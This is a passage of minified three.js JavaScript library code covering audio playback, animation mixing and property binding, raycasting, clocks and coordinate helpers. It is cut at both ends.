this},setBuffer:function(a){this.buffer=a;this.sourceType=\"buffer\";this.autoplay&&this.play();return this},play:function(){if(!0===this.isPlaying)console.warn(\"THREE.Audio: Audio is already playing.\");else if(!1===this.hasPlaybackControl)console.warn(\"THREE.Audio: this Audio has no playback control.\");else{var a=this.context.createBufferSource();a.buffer=this.buffer;a.loop=this.loop;a.onended=this.onEnded.bind(this);a.playbackRate.setValueAtTime(this.playbackRate,\nthis.startTime);a.start(0,this.startTime);this.isPlaying=!0;this.source=a;return this.connect()}},pause:function(){if(!1===this.hasPlaybackControl)console.warn(\"THREE.Audio: this Audio has no playback control.\");else return this.source.stop(),this.startTime=this.context.currentTime,this.isPlaying=!1,this},stop:function(){if(!1===this.hasPlaybackControl)console.warn(\"THREE.Audio: this Audio has no playback control.\");else return this.source.stop(),this.startTime=0,this.isPlaying=!1,this},connect:function(){if(0<\nthis.filters.length){this.source.connect(this.filters[0]);for(var a=1,b=this.filters.length;a<b;a++)this.filters[a-1].connect(this.filters[a]);this.filters[this.filters.length-1].connect(this.getOutput())}else this.source.connect(this.getOutput());return this},disconnect:function(){if(0<this.filters.length){this.source.disconnect(this.filters[0]);for(var a=1,b=this.filters.length;a<b;a++)this.filters[a-1].disconnect(this.filters[a]);this.filters[this.filters.length-1].disconnect(this.getOutput())}else this.source.disconnect(this.getOutput());\nreturn this},getFilters:function(){return this.filters},setFilters:function(a){a||(a=[]);!0===this.isPlaying?(this.disconnect(),this.filters=a,this.connect()):this.filters=a;return this},getFilter:function(){return this.getFilters()[0]},setFilter:function(a){return this.setFilters(a?[a]:[])},setPlaybackRate:function(a){if(!1===this.hasPlaybackControl)console.warn(\"THREE.Audio: this Audio has no playback control.\");else return this.playbackRate=a,!0===this.isPlaying&&this.source.playbackRate.setValueAtTime(this.playbackRate,\nthis.context.currentTime),this},getPlaybackRate:function(){return this.playbackRate},onEnded:function(){this.isPlaying=!1},getLoop:function(){return!1===this.hasPlaybackControl?(console.warn(\"THREE.Audio: this Audio has no playback control.\"),!1):this.loop},setLoop:function(a){if(!1===this.hasPlaybackControl)console.warn(\"THREE.Audio: this Audio has no playback control.\");else return this.loop=a,!0===this.isPlaying&&(this.source.loop=this.loop),this},getVolume:function(){return this.gain.gain.value},\nsetVolume:function(a){this.gain.gain.value=a;return this}});ke.prototype=Object.assign(Object.create(hc.prototype),{constructor:ke,getOutput:function(){return this.panner},getRefDistance:function(){return this.panner.refDistance},setRefDistance:function(a){this.panner.refDistance=a},getRolloffFactor:function(){return this.panner.rolloffFactor},setRolloffFactor:function(a){this.panner.rolloffFactor=a},getDistanceModel:function(){return this.panner.distanceModel},setDistanceModel:function(a){this.panner.distanceModel=\na},getMaxDistance:function(){return this.panner.maxDistance},setMaxDistance:function(a){this.panner.maxDistance=a},updateMatrixWorld:function(){var a=new q;return function(b){x.prototype.updateMatrixWorld.call(this,b);a.setFromMatrixPosition(this.matrixWorld);this.panner.setPosition(a.x,a.y,a.z)}}()});Object.assign(le.prototype,{getFrequencyData:function(){this.analyser.getByteFrequencyData(this.data);return this.data},getAverageFrequency:function(){for(var a=0,b=this.getFrequencyData(),c=0;c<b.length;c++)a+=\nb[c];return a/b.length}});Jd.prototype={constructor:Jd,accumulate:function(a,b){var c=this.buffer,d=this.valueSize,e=a*d+d,f=this.cumulativeWeight;if(0===f){for(f=0;f!==d;++f)c[e+f]=c[f];f=b}else f+=b,this._mixBufferRegion(c,e,0,b/f,d);this.cumulativeWeight=f},apply:function(a){var b=this.valueSize,c=this.buffer;a=a*b+b;var d=this.cumulativeWeight,e=this.binding;this.cumulativeWeight=0;1>d&&this._mixBufferRegion(c,a,3*b,1-d,b);for(var d=b,f=b+b;d!==f;++d)if(c[d]!==c[d+b]){e.setValue(c,a);break}},\nsaveOriginalState:function(){var a=this.buffer,b=this.valueSize,c=3*b;this.binding.getValue(a,c);for(var d=b;d!==c;++d)a[d]=a[c+d%b];this.cumulativeWeight=0},restoreOriginalState:function(){this.binding.setValue(this.buffer,3*this.valueSize)},_select:function(a,b,c,d,e){if(.5<=d)for(d=0;d!==e;++d)a[b+d]=a[c+d]},_slerp:function(a,b,c,d,e){ca.slerpFlat(a,b,a,b,a,c,d)},_lerp:function(a,b,c,d,e){for(var f=1-d,g=0;g!==e;++g){var h=b+g;a[h]=a[h]*f+a[c+g]*d}}};ka.prototype={constructor:ka,getValue:function(a,\nb){this.bind();this.getValue(a,b)},setValue:function(a,b){this.bind();this.setValue(a,b)},bind:function(){var a=this.node,b=this.parsedPath,c=b.objectName,d=b.propertyName,e=b.propertyIndex;a||(this.node=a=ka.findNode(this.rootNode,b.nodeName)||this.rootNode);this.getValue=this._getValue_unavailable;this.setValue=this._setValue_unavailable;if(a){if(c){var f=b.objectIndex;switch(c){case \"materials\":if(!a.material){console.error(\"  can not bind to material as node does not have a material\",this);return}if(!a.material.materials){console.error(\"  can not bind to material.materials as node.material does not have a materials array\",\nthis);return}a=a.material.materials;break;case \"bones\":if(!a.skeleton){console.error(\"  can not bind to bones as node does not have a skeleton\",this);return}a=a.skeleton.bones;for(c=0;c<a.length;c++)if(a[c].name===f){f=c;break}break;default:if(void 0===a[c]){console.error(\"  can not bind to objectName of node, undefined\",this);return}a=a[c]}if(void 0!==f){if(void 0===a[f]){console.error(\"  trying to bind to objectIndex of objectName, but is undefined:\",this,a);return}a=a[f]}}f=a[d];if(void 0===f)console.error(\"  trying to update property for track: \"+\nb.nodeName+\".\"+d+\" but it wasn't found.\",a);else{b=this.Versioning.None;void 0!==a.needsUpdate?(b=this.Versioning.NeedsUpdate,this.targetObject=a):void 0!==a.matrixWorldNeedsUpdate&&(b=this.Versioning.MatrixWorldNeedsUpdate,this.targetObject=a);c=this.BindingType.Direct;if(void 0!==e){if(\"morphTargetInfluences\"===d){if(!a.geometry){console.error(\"  can not bind to morphTargetInfluences becasuse node does not have a geometry\",this);return}if(!a.geometry.morphTargets){console.error(\"  can not bind to morphTargetInfluences becasuse node does not have a geometry.morphTargets\",\nthis);return}for(c=0;c<this.node.geometry.morphTargets.length;c++)if(a.geometry.morphTargets[c].name===e){e=c;break}}c=this.BindingType.ArrayElement;this.resolvedProperty=f;this.propertyIndex=e}else void 0!==f.fromArray&&void 0!==f.toArray?(c=this.BindingType.HasFromToArray,this.resolvedProperty=f):void 0!==f.length?(c=this.BindingType.EntireArray,this.resolvedProperty=f):this.propertyName=d;this.getValue=this.GetterByBindingType[c];this.setValue=this.SetterByBindingTypeAndVersioning[c][b]}}else console.error(\"  trying to update node for track: \"+\nthis.path+\" but it wasn't found.\")},unbind:function(){this.node=null;this.getValue=this._getValue_unbound;this.setValue=this._setValue_unbound}};Object.assign(ka.prototype,{_getValue_unavailable:function(){},_setValue_unavailable:function(){},_getValue_unbound:ka.prototype.getValue,_setValue_unbound:ka.prototype.setValue,BindingType:{Direct:0,EntireArray:1,ArrayElement:2,HasFromToArray:3},Versioning:{None:0,NeedsUpdate:1,MatrixWorldNeedsUpdate:2},GetterByBindingType:[function(a,b){a[b]=this.node[this.propertyName]},\nfunction(a,b){for(var c=this.resolvedProperty,d=0,e=c.length;d!==e;++d)a[b++]=c[d]},function(a,b){a[b]=this.resolvedProperty[this.propertyIndex]},function(a,b){this.resolvedProperty.toArray(a,b)}],SetterByBindingTypeAndVersioning:[[function(a,b){this.node[this.propertyName]=a[b]},function(a,b){this.node[this.propertyName]=a[b];this.targetObject.needsUpdate=!0},function(a,b){this.node[this.propertyName]=a[b];this.targetObject.matrixWorldNeedsUpdate=!0}],[function(a,b){for(var c=this.resolvedProperty,\nd=0,e=c.length;d!==e;++d)c[d]=a[b++]},function(a,b){for(var c=this.resolvedProperty,d=0,e=c.length;d!==e;++d)c[d]=a[b++];this.targetObject.needsUpdate=!0},function(a,b){for(var c=this.resolvedProperty,d=0,e=c.length;d!==e;++d)c[d]=a[b++];this.targetObject.matrixWorldNeedsUpdate=!0}],[function(a,b){this.resolvedProperty[this.propertyIndex]=a[b]},function(a,b){this.resolvedProperty[this.propertyIndex]=a[b];this.targetObject.needsUpdate=!0},function(a,b){this.resolvedProperty[this.propertyIndex]=a[b];\nthis.targetObject.matrixWorldNeedsUpdate=!0}],[function(a,b){this.resolvedProperty.fromArray(a,b)},function(a,b){this.resolvedProperty.fromArray(a,b);this.targetObject.needsUpdate=!0},function(a,b){this.resolvedProperty.fromArray(a,b);this.targetObject.matrixWorldNeedsUpdate=!0}]]});ka.Composite=function(a,b,c){c=c||ka.parseTrackName(b);this._targetGroup=a;this._bindings=a.subscribe_(b,c)};ka.Composite.prototype={constructor:ka.Composite,getValue:function(a,b){this.bind();var c=this._bindings[this._targetGroup.nCachedObjects_];\nvoid 0!==c&&c.getValue(a,b)},setValue:function(a,b){for(var c=this._bindings,d=this._targetGroup.nCachedObjects_,e=c.length;d!==e;++d)c[d].setValue(a,b)},bind:function(){for(var a=this._bindings,b=this._targetGroup.nCachedObjects_,c=a.length;b!==c;++b)a[b].bind()},unbind:function(){for(var a=this._bindings,b=this._targetGroup.nCachedObjects_,c=a.length;b!==c;++b)a[b].unbind()}};ka.create=function(a,b,c){return a&&a.isAnimationObjectGroup?new ka.Composite(a,b,c):new ka(a,b,c)};ka.parseTrackName=function(a){var b=\n/^((?:[\\w-]+[\\/:])*)([\\w-]+)?(?:\\.([\\w-]+)(?:\\[(.+)\\])?)?\\.([\\w-]+)(?:\\[(.+)\\])?$/.exec(a);if(!b)throw Error(\"cannot parse trackName at all: \"+a);b={nodeName:b[2],objectName:b[3],objectIndex:b[4],propertyName:b[5],propertyIndex:b[6]};if(null===b.propertyName||0===b.propertyName.length)throw Error(\"can not parse propertyName from trackName: \"+a);return b};ka.findNode=function(a,b){if(!b||\"\"===b||\"root\"===b||\".\"===b||-1===b||b===a.name||b===a.uuid)return a;if(a.skeleton){var c=function(a){for(var c=\n0;c<a.bones.length;c++){var d=a.bones[c];if(d.name===b)return d}return null}(a.skeleton);if(c)return c}if(a.children){var d=function(a){for(var c=0;c<a.length;c++){var g=a[c];if(g.name===b||g.uuid===b||(g=d(g.children)))return g}return null};if(c=d(a.children))return c}return null};me.prototype={constructor:me,isAnimationObjectGroup:!0,add:function(a){for(var b=this._objects,c=b.length,d=this.nCachedObjects_,e=this._indicesByUUID,f=this._paths,g=this._parsedPaths,h=this._bindings,m=h.length,k=0,l=\narguments.length;k!==l;++k){var p=arguments[k],n=p.uuid,q=e[n];if(void 0===q){q=c++;e[n]=q;b.push(p);for(var n=0,x=m;n!==x;++n)h[n].push(new ka(p,f[n],g[n]))}else if(q<d){var r=--d,x=b[r];e[x.uuid]=q;b[q]=x;e[n]=r;b[r]=p;n=0;for(x=m;n!==x;++n){var z=h[n],w=z[q];z[q]=z[r];void 0===w&&(w=new ka(p,f[n],g[n]));z[r]=w}}else void 0!==b[q]&&console.error(\"Different objects with the same UUID detected. Clean the caches or recreate your infrastructure when reloading scenes...\")}this.nCachedObjects_=d},remove:function(a){for(var b=\nthis._objects,c=this.nCachedObjects_,d=this._indicesByUUID,e=this._bindings,f=e.length,g=0,h=arguments.length;g!==h;++g){var m=arguments[g],k=m.uuid,l=d[k];if(void 0!==l&&l>=c){var p=c++,n=b[p];d[n.uuid]=l;b[l]=n;d[k]=p;b[p]=m;m=0;for(k=f;m!==k;++m){var n=e[m],q=n[l];n[l]=n[p];n[p]=q}}}this.nCachedObjects_=c},uncache:function(a){for(var b=this._objects,c=b.length,d=this.nCachedObjects_,e=this._indicesByUUID,f=this._bindings,g=f.length,h=0,m=arguments.length;h!==m;++h){var k=arguments[h].uuid,l=e[k];\nif(void 0!==l)if(delete e[k],l<d){var k=--d,p=b[k],n=--c,q=b[n];e[p.uuid]=l;b[l]=p;e[q.uuid]=k;b[k]=q;b.pop();p=0;for(q=g;p!==q;++p){var x=f[p],r=x[n];x[l]=x[k];x[k]=r;x.pop()}}else for(n=--c,q=b[n],e[q.uuid]=l,b[l]=q,b.pop(),p=0,q=g;p!==q;++p)x=f[p],x[l]=x[n],x.pop()}this.nCachedObjects_=d},subscribe_:function(a,b){var c=this._bindingsIndicesByPath,d=c[a],e=this._bindings;if(void 0!==d)return e[d];var f=this._paths,g=this._parsedPaths,h=this._objects,l=this.nCachedObjects_,k=Array(h.length),d=e.length;\nc[a]=d;f.push(a);g.push(b);e.push(k);c=l;for(d=h.length;c!==d;++c)k[c]=new ka(h[c],a,b);return k},unsubscribe_:function(a){var b=this._bindingsIndicesByPath,c=b[a];if(void 0!==c){var d=this._paths,e=this._parsedPaths,f=this._bindings,g=f.length-1,h=f[g];b[a[g]]=c;f[c]=h;f.pop();e[c]=e[g];e.pop();d[c]=d[g];d.pop()}}};ne.prototype={constructor:ne,play:function(){this._mixer._activateAction(this);return this},stop:function(){this._mixer._deactivateAction(this);return this.reset()},reset:function(){this.paused=\n!1;this.enabled=!0;this.time=0;this._loopCount=-1;this._startTime=null;return this.stopFading().stopWarping()},isRunning:function(){return this.enabled&&!this.paused&&0!==this.timeScale&&null===this._startTime&&this._mixer._isActiveAction(this)},isScheduled:function(){return this._mixer._isActiveAction(this)},startAt:function(a){this._startTime=a;return this},setLoop:function(a,b){this.loop=a;this.repetitions=b;return this},setEffectiveWeight:function(a){this.weight=a;this._effectiveWeight=this.enabled?\na:0;return this.stopFading()},getEffectiveWeight:function(){return this._effectiveWeight},fadeIn:function(a){return this._scheduleFading(a,0,1)},fadeOut:function(a){return this._scheduleFading(a,1,0)},crossFadeFrom:function(a,b,c){a.fadeOut(b);this.fadeIn(b);if(c){c=this._clip.duration;var d=a._clip.duration,e=c/d;a.warp(1,d/c,b);this.warp(e,1,b)}return this},crossFadeTo:function(a,b,c){return a.crossFadeFrom(this,b,c)},stopFading:function(){var a=this._weightInterpolant;null!==a&&(this._weightInterpolant=\nnull,this._mixer._takeBackControlInterpolant(a));return this},setEffectiveTimeScale:function(a){this.timeScale=a;this._effectiveTimeScale=this.paused?0:a;return this.stopWarping()},getEffectiveTimeScale:function(){return this._effectiveTimeScale},setDuration:function(a){this.timeScale=this._clip.duration/a;return this.stopWarping()},syncWith:function(a){this.time=a.time;this.timeScale=a.timeScale;return this.stopWarping()},halt:function(a){return this.warp(this._effectiveTimeScale,0,a)},warp:function(a,\nb,c){var d=this._mixer,e=d.time,f=this._timeScaleInterpolant,g=this.timeScale;null===f&&(this._timeScaleInterpolant=f=d._lendControlInterpolant());d=f.parameterPositions;f=f.sampleValues;d[0]=e;d[1]=e+c;f[0]=a/g;f[1]=b/g;return this},stopWarping:function(){var a=this._timeScaleInterpolant;null!==a&&(this._timeScaleInterpolant=null,this._mixer._takeBackControlInterpolant(a));return this},getMixer:function(){return this._mixer},getClip:function(){return this._clip},getRoot:function(){return this._localRoot||\nthis._mixer._root},_update:function(a,b,c,d){var e=this._startTime;if(null!==e){b=(a-e)*c;if(0>b||0===c)return;this._startTime=null;b*=c}b*=this._updateTimeScale(a);c=this._updateTime(b);a=this._updateWeight(a);if(0<a){b=this._interpolants;for(var e=this._propertyBindings,f=0,g=b.length;f!==g;++f)b[f].evaluate(c),e[f].accumulate(d,a)}},_updateWeight:function(a){var b=0;if(this.enabled){var b=this.weight,c=this._weightInterpolant;if(null!==c){var d=c.evaluate(a)[0],b=b*d;a>c.parameterPositions[1]&&\n(this.stopFading(),0===d&&(this.enabled=!1))}}return this._effectiveWeight=b},_updateTimeScale:function(a){var b=0;if(!this.paused){var b=this.timeScale,c=this._timeScaleInterpolant;if(null!==c){var d=c.evaluate(a)[0],b=b*d;a>c.parameterPositions[1]&&(this.stopWarping(),0===b?this.paused=!0:this.timeScale=b)}}return this._effectiveTimeScale=b},_updateTime:function(a){var b=this.time+a;if(0===a)return b;var c=this._clip.duration,d=this.loop,e=this._loopCount;if(2200===d)a:{if(-1===e&&(this._loopCount=\n0,this._setEndings(!0,!0,!1)),b>=c)b=c;else if(0>b)b=0;else break a;this.clampWhenFinished?this.paused=!0:this.enabled=!1;this._mixer.dispatchEvent({type:\"finished\",action:this,direction:0>a?-1:1})}else{d=2202===d;-1===e&&(0<=a?(e=0,this._setEndings(!0,0===this.repetitions,d)):this._setEndings(0===this.repetitions,!0,d));if(b>=c||0>b){var f=Math.floor(b/c),b=b-c*f,e=e+Math.abs(f),g=this.repetitions-e;0>g?(this.clampWhenFinished?this.paused=!0:this.enabled=!1,b=0<a?c:0,this._mixer.dispatchEvent({type:\"finished\",\naction:this,direction:0<a?1:-1})):(0===g?(a=0>a,this._setEndings(a,!a,d)):this._setEndings(!1,!1,d),this._loopCount=e,this._mixer.dispatchEvent({type:\"loop\",action:this,loopDelta:f}))}if(d&&1===(e&1))return this.time=b,c-b}return this.time=b},_setEndings:function(a,b,c){var d=this._interpolantSettings;c?(d.endingStart=2401,d.endingEnd=2401):(d.endingStart=a?this.zeroSlopeAtStart?2401:2400:2402,d.endingEnd=b?this.zeroSlopeAtEnd?2401:2400:2402)},_scheduleFading:function(a,b,c){var d=this._mixer,e=d.time,\nf=this._weightInterpolant;null===f&&(this._weightInterpolant=f=d._lendControlInterpolant());d=f.parameterPositions;f=f.sampleValues;d[0]=e;f[0]=b;d[1]=e+a;f[1]=c;return this}};cd.prototype={constructor:cd,clipAction:function(a,b){var c=b||this._root,d=c.uuid,e=\"string\"===typeof a?qa.findByName(c,a):a,c=null!==e?e.uuid:a,f=this._actionsByClip[c],g=null;if(void 0!==f){g=f.actionByRoot[d];if(void 0!==g)return g;g=f.knownActions[0];null===e&&(e=g._clip)}if(null===e)return null;e=new ne(this,e,b);this._bindAction(e,\ng);this._addInactiveAction(e,c,d);return e},existingAction:function(a,b){var c=b||this._root,d=c.uuid,c=\"string\"===typeof a?qa.findByName(c,a):a,c=this._actionsByClip[c?c.uuid:a];return void 0!==c?c.actionByRoot[d]||null:null},stopAllAction:function(){for(var a=this._actions,b=this._nActiveActions,c=this._bindings,d=this._nActiveBindings,e=this._nActiveBindings=this._nActiveActions=0;e!==b;++e)a[e].reset();for(e=0;e!==d;++e)c[e].useCount=0;return this},update:function(a){a*=this.timeScale;for(var b=\nthis._actions,c=this._nActiveActions,d=this.time+=a,e=Math.sign(a),f=this._accuIndex^=1,g=0;g!==c;++g){var h=b[g];h.enabled&&h._update(d,a,e,f)}a=this._bindings;b=this._nActiveBindings;for(g=0;g!==b;++g)a[g].apply(f);return this},getRoot:function(){return this._root},uncacheClip:function(a){var b=this._actions;a=a.uuid;var c=this._actionsByClip,d=c[a];if(void 0!==d){for(var d=d.knownActions,e=0,f=d.length;e!==f;++e){var g=d[e];this._deactivateAction(g);var h=g._cacheIndex,l=b[b.length-1];g._cacheIndex=\nnull;g._byClipCacheIndex=null;l._cacheIndex=h;b[h]=l;b.pop();this._removeInactiveBindingsForAction(g)}delete c[a]}},uncacheRoot:function(a){a=a.uuid;var b=this._actionsByClip,c;for(c in b){var d=b[c].actionByRoot[a];void 0!==d&&(this._deactivateAction(d),this._removeInactiveAction(d))}c=this._bindingsByRootAndName[a];if(void 0!==c)for(var e in c)a=c[e],a.restoreOriginalState(),this._removeInactiveBinding(a)},uncacheAction:function(a,b){var c=this.existingAction(a,b);null!==c&&(this._deactivateAction(c),\nthis._removeInactiveAction(c))}};Object.assign(cd.prototype,{_bindAction:function(a,b){var c=a._localRoot||this._root,d=a._clip.tracks,e=d.length,f=a._propertyBindings,g=a._interpolants,h=c.uuid,l=this._bindingsByRootAndName,k=l[h];void 0===k&&(k={},l[h]=k);for(l=0;l!==e;++l){var q=d[l],p=q.name,n=k[p];if(void 0===n){n=f[l];if(void 0!==n){null===n._cacheIndex&&(++n.referenceCount,this._addInactiveBinding(n,h,p));continue}n=new Jd(ka.create(c,p,b&&b._propertyBindings[l].binding.parsedPath),q.ValueTypeName,\nq.getValueSize());++n.referenceCount;this._addInactiveBinding(n,h,p)}f[l]=n;g[l].resultBuffer=n.buffer}},_activateAction:function(a){if(!this._isActiveAction(a)){if(null===a._cacheIndex){var b=(a._localRoot||this._root).uuid,c=a._clip.uuid,d=this._actionsByClip[c];this._bindAction(a,d&&d.knownActions[0]);this._addInactiveAction(a,c,b)}b=a._propertyBindings;c=0;for(d=b.length;c!==d;++c){var e=b[c];0===e.useCount++&&(this._lendBinding(e),e.saveOriginalState())}this._lendAction(a)}},_deactivateAction:function(a){if(this._isActiveAction(a)){for(var b=\na._propertyBindings,c=0,d=b.length;c!==d;++c){var e=b[c];0===--e.useCount&&(e.restoreOriginalState(),this._takeBackBinding(e))}this._takeBackAction(a)}},_initMemoryManager:function(){this._actions=[];this._nActiveActions=0;this._actionsByClip={};this._bindings=[];this._nActiveBindings=0;this._bindingsByRootAndName={};this._controlInterpolants=[];this._nActiveControlInterpolants=0;var a=this;this.stats={actions:{get total(){return a._actions.length},get inUse(){return a._nActiveActions}},bindings:{get total(){return a._bindings.length},\nget inUse(){return a._nActiveBindings}},controlInterpolants:{get total(){return a._controlInterpolants.length},get inUse(){return a._nActiveControlInterpolants}}}},_isActiveAction:function(a){a=a._cacheIndex;return null!==a&&a<this._nActiveActions},_addInactiveAction:function(a,b,c){var d=this._actions,e=this._actionsByClip,f=e[b];void 0===f?(f={knownActions:[a],actionByRoot:{}},a._byClipCacheIndex=0,e[b]=f):(b=f.knownActions,a._byClipCacheIndex=b.length,b.push(a));a._cacheIndex=d.length;d.push(a);\nf.actionByRoot[c]=a},_removeInactiveAction:function(a){var b=this._actions,c=b[b.length-1],d=a._cacheIndex;c._cacheIndex=d;b[d]=c;b.pop();a._cacheIndex=null;var c=a._clip.uuid,d=this._actionsByClip,e=d[c],f=e.knownActions,g=f[f.length-1],h=a._byClipCacheIndex;g._byClipCacheIndex=h;f[h]=g;f.pop();a._byClipCacheIndex=null;delete e.actionByRoot[(b._localRoot||this._root).uuid];0===f.length&&delete d[c];this._removeInactiveBindingsForAction(a)},_removeInactiveBindingsForAction:function(a){a=a._propertyBindings;\nfor(var b=0,c=a.length;b!==c;++b){var d=a[b];0===--d.referenceCount&&this._removeInactiveBinding(d)}},_lendAction:function(a){var b=this._actions,c=a._cacheIndex,d=this._nActiveActions++,e=b[d];a._cacheIndex=d;b[d]=a;e._cacheIndex=c;b[c]=e},_takeBackAction:function(a){var b=this._actions,c=a._cacheIndex,d=--this._nActiveActions,e=b[d];a._cacheIndex=d;b[d]=a;e._cacheIndex=c;b[c]=e},_addInactiveBinding:function(a,b,c){var d=this._bindingsByRootAndName,e=d[b],f=this._bindings;void 0===e&&(e={},d[b]=\ne);e[c]=a;a._cacheIndex=f.length;f.push(a)},_removeInactiveBinding:function(a){var b=this._bindings,c=a.binding,d=c.rootNode.uuid,c=c.path,e=this._bindingsByRootAndName,f=e[d],g=b[b.length-1];a=a._cacheIndex;g._cacheIndex=a;b[a]=g;b.pop();delete f[c];a:{for(var h in f)break a;delete e[d]}},_lendBinding:function(a){var b=this._bindings,c=a._cacheIndex,d=this._nActiveBindings++,e=b[d];a._cacheIndex=d;b[d]=a;e._cacheIndex=c;b[c]=e},_takeBackBinding:function(a){var b=this._bindings,c=a._cacheIndex,d=\n--this._nActiveBindings,e=b[d];a._cacheIndex=d;b[d]=a;e._cacheIndex=c;b[c]=e},_lendControlInterpolant:function(){var a=this._controlInterpolants,b=this._nActiveControlInterpolants++,c=a[b];void 0===c&&(c=new Zc(new Float32Array(2),new Float32Array(2),1,this._controlInterpolantsResultBuffer),c.__cacheIndex=b,a[b]=c);return c},_takeBackControlInterpolant:function(a){var b=this._controlInterpolants,c=a.__cacheIndex,d=--this._nActiveControlInterpolants,e=b[d];a.__cacheIndex=d;b[d]=a;e.__cacheIndex=c;\nb[c]=e},_controlInterpolantsResultBuffer:new Float32Array(1)});Object.assign(cd.prototype,pa.prototype);Kd.prototype.clone=function(){return new Kd(void 0===this.value.clone?this.value:this.value.clone())};Eb.prototype=Object.create(I.prototype);Eb.prototype.constructor=Eb;Eb.prototype.isInstancedBufferGeometry=!0;Eb.prototype.addGroup=function(a,b,c){this.groups.push({start:a,count:b,materialIndex:c})};Eb.prototype.copy=function(a){var b=a.index;null!==b&&this.setIndex(b.clone());var b=a.attributes,\nc;for(c in b)this.addAttribute(c,b[c].clone());a=a.groups;c=0;for(b=a.length;c<b;c++){var d=a[c];this.addGroup(d.start,d.count,d.materialIndex)}return this};oe.prototype={constructor:oe,isInterleavedBufferAttribute:!0,get count(){return this.data.count},get array(){return this.data.array},setX:function(a,b){this.data.array[a*this.data.stride+this.offset]=b;return this},setY:function(a,b){this.data.array[a*this.data.stride+this.offset+1]=b;return this},setZ:function(a,b){this.data.array[a*this.data.stride+\nthis.offset+2]=b;return this},setW:function(a,b){this.data.array[a*this.data.stride+this.offset+3]=b;return this},getX:function(a){return this.data.array[a*this.data.stride+this.offset]},getY:function(a){return this.data.array[a*this.data.stride+this.offset+1]},getZ:function(a){return this.data.array[a*this.data.stride+this.offset+2]},getW:function(a){return this.data.array[a*this.data.stride+this.offset+3]},setXY:function(a,b,c){a=a*this.data.stride+this.offset;this.data.array[a+0]=b;this.data.array[a+\n1]=c;return this},setXYZ:function(a,b,c,d){a=a*this.data.stride+this.offset;this.data.array[a+0]=b;this.data.array[a+1]=c;this.data.array[a+2]=d;return this},setXYZW:function(a,b,c,d,e){a=a*this.data.stride+this.offset;this.data.array[a+0]=b;this.data.array[a+1]=c;this.data.array[a+2]=d;this.data.array[a+3]=e;return this}};ic.prototype={constructor:ic,isInterleavedBuffer:!0,set needsUpdate(a){!0===a&&this.version++},setArray:function(a){if(Array.isArray(a))throw new TypeError(\"THREE.BufferAttribute: array should be a Typed Array.\");\nthis.count=void 0!==a?a.length/this.stride:0;this.array=a},setDynamic:function(a){this.dynamic=a;return this},copy:function(a){this.array=new a.array.constructor(a.array);this.count=a.count;this.stride=a.stride;this.dynamic=a.dynamic;return this},copyAt:function(a,b,c){a*=this.stride;c*=b.stride;for(var d=0,e=this.stride;d<e;d++)this.array[a+d]=b.array[c+d];return this},set:function(a,b){void 0===b&&(b=0);this.array.set(a,b);return this},clone:function(){return(new this.constructor).copy(this)},onUpload:function(a){this.onUploadCallback=\na;return this}};jc.prototype=Object.create(ic.prototype);jc.prototype.constructor=jc;jc.prototype.isInstancedInterleavedBuffer=!0;jc.prototype.copy=function(a){ic.prototype.copy.call(this,a);this.meshPerAttribute=a.meshPerAttribute;return this};kc.prototype=Object.create(U.prototype);kc.prototype.constructor=kc;kc.prototype.isInstancedBufferAttribute=!0;kc.prototype.copy=function(a){U.prototype.copy.call(this,a);this.meshPerAttribute=a.meshPerAttribute;return this};pe.prototype={constructor:pe,linePrecision:1,\nset:function(a,b){this.ray.set(a,b)},setFromCamera:function(a,b){b&&b.isPerspectiveCamera?(this.ray.origin.setFromMatrixPosition(b.matrixWorld),this.ray.direction.set(a.x,a.y,.5).unproject(b).sub(this.ray.origin).normalize()):b&&b.isOrthographicCamera?(this.ray.origin.set(a.x,a.y,(b.near+b.far)/(b.near-b.far)).unproject(b),this.ray.direction.set(0,0,-1).transformDirection(b.matrixWorld)):console.error(\"THREE.Raycaster: Unsupported camera type.\")},intersectObject:function(a,b){var c=[];qe(a,this,c,\nb);c.sort(We);return c},intersectObjects:function(a,b){var c=[];if(!1===Array.isArray(a))return console.warn(\"THREE.Raycaster.intersectObjects: objects is not an Array.\"),c;for(var d=0,e=a.length;d<e;d++)qe(a[d],this,c,b);c.sort(We);return c}};re.prototype={constructor:re,start:function(){this.oldTime=this.startTime=(performance||Date).now();this.elapsedTime=0;this.running=!0},stop:function(){this.getElapsedTime();this.running=!1},getElapsedTime:function(){this.getDelta();return this.elapsedTime},\ngetDelta:function(){var a=0;this.autoStart&&!this.running&&this.start();if(this.running){var b=(performance||Date).now(),a=(b-this.oldTime)/1E3;this.oldTime=b;this.elapsedTime+=a}return a}};se.prototype={constructor:se,set:function(a,b,c){this.radius=a;this.phi=b;this.theta=c;return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.radius=a.radius;this.phi=a.phi;this.theta=a.theta;return this},makeSafe:function(){this.phi=Math.max(1E-6,Math.min(Math.PI-1E-6,this.phi));\nreturn this},setFromVector3:function(a){this.radius=a.length();0===this.radius?this.phi=this.theta=0:(this.theta=Math.atan2(a.x,a.z),this.phi=Math.acos(N.clamp(a.y/this.radius,-1,1)));return this}};te.prototype={constructor:te,set:function(a,b,c){this.radius=a;this.theta=b;this.y=c;return this},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.radius=a.radius;this.theta=a.theta;this.y=a.y;return this},setFromVector3:function(a){this.radius=Math.sqrt(a.x*a.x+a.z*a.z);\nthis.theta=Math.atan2(a.x,a.z);this.y=a.y;return this}};oa.prototype=Object.create(Aa.prototype);oa.prototype.constructor=oa;oa.prototype.createAnimation=function(a,b,c,d){b={start:b,end:c,length:c-b+1,fps:d,duration:(c-b)/d,lastFrame:0,currentFrame:0,active:!1,time:0,direction:1,weight:1,directionBackwards:!1,mirroredLoop:!1};this.animationsMap[a]=b;this.animationsList.push(b)};oa.prototype.autoCreateAnimations=function(a){for(var b=/([a-z]+)_?(\\d+)/i,c,d={},e=this.geometry,f=0,g=e.morphTargets.length;f<\ng;f++){var h=e.morphTargets[f].name.match(b);if(h&&1<h.length){var l=h[1];d[l]||(d[l]={start:Infinity,end:-Infinity});h=d[l];f<h.start&&(h.start=f);f>h.end&&(h.end=f);c||(c=l)}}for(l in d)h=d[l],this.createAnimation(l,h.start,h.end,a);this.firstAnimation=c};oa.prototype.setAnimationDirectionForward=function(a){if(a=this.animationsMap[a])a.direction=1,a.directionBackwards=!1};oa.prototype.setAnimationDirectionBackward=function(a){if(a=this.animationsMap[a])a.direction=-1,a.directionBackwards=!0};oa.prototype.setAnimationFPS=\nfunction(a,b){var 